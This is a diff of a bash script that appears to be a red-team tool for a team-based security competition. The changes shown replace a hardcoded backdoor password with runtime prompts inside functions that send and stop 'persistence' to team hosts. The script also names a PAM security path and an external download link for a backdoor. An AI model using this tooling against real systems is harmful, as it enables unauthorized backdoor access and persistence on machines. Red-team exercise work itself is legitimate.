@@ -6,7 +6,6 @@ number_of_teams=10
 host_ids=(10 20 30 40 50)
 admins=("admin1" "admin2" "admin3")
 default_password="Password1!"
-backdoor_password="yuh"
 timeout_duration=1
 path_to_pam="/usr/lib/x86_64-linux-gnu/security"
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
@@ -50,6 +49,7 @@ send_backdoor() {
 
 send_persistence() {
     read -p "Team to Send Persistence to: " team_number
+    read -p "Backdoor Password: " backdoor_password
     count=0
 
     while IFS= read -r IP; do
@@ -74,6 +74,7 @@ send_persistence() {
 
 stop_sending_persistence() {
     read -p "Team to Stop Sending Persistence to: " team_number
+    read -p "Backdoor Password: " backdoor_password
     count=0
 
     while IFS= read -r IP; do
